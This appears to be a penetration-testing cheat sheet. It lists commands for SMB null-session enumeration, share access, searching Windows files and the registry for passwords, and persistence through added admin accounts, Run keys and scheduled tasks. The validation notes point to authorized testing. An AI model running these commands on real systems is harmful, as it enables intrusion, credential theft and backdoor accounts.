# SMB Enumeration

## Overview

Enumerate NetBIOS, SMB shares, null sessions, and anonymous access from Linux.

## Commands

Password policy (Metasploit):
    msf > use auxiliary/scanner/smb/smb_enumusers

Null session and RPC:
    enum4linux-ng -A <target IP>
    enum4linux -a <target IP>
    nbtscan <target IP>

    rpcclient -U "" <target IP>
    Enter 's password: <return>
    rpcclient $> srvinfo
    rpcclient $> enumdomusers
    rpcclient $> queryuser <user>
    rpcclient $> netshareenum
    rpcclient $> netshareenumall
    rpcclient $> querydominfo
    rpcclient $> getdompwinfo

    net use \\<target IP>\ipc$ "" /u:""

Share mapping:
    smbmap -H <target IP>
    crackmapexec smb <target IP> -u '' -p ''
    crackmapexec smb <target IP> --shares -u <user> -p <password>

    nbtscan -r <target range>
    nbtscan -f hosts.txt

Anonymous smbclient:
    smbclient -L <target IP>
    smbclient //<target IP>/<share>
    smb: \> dir
    smb: \> more file.txt
    smb: \> get file.txt
    smb: \> put file.txt

With credentials:
    smbclient //<target IP>/<share> -U <user>

## Validation / False Positives

Null session or guest access that only lists share names is lower severity than readable or writable shares.
Confirm write access with smbclient put or crackmapexec --shares before reporting writable shares.

doskey /history

Get-Service | ? {$_.Status -eq "Running"} | select -First 20 | fl

# Data Mining

## Commands

dir /s *password* == *cred* == *vnc*
findstr /si password *.ini *.pdf *.txt *.docx *.xlsx
reg query HKCU /f password /t REG_SZ /s
type <file>

## Validation / False Positives

A filename containing "password" is not proof of a stored secret — open the file and confirm content.


# Persistence

## Commands

Local admin user:
    net user <user> <password> /add
    net localgroup Administrators <user> /add

Registry Run key:
    reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v <key name> /t REG_SZ /f /d <path to binary>
    reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v <key name>

Scheduled task:
    schtasks /create /f /tn <task name> /SC DAILY /st 09:00 /tr <path to binary>
    schtasks /delete /f /tn <task name>

Startup directory:
    %SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
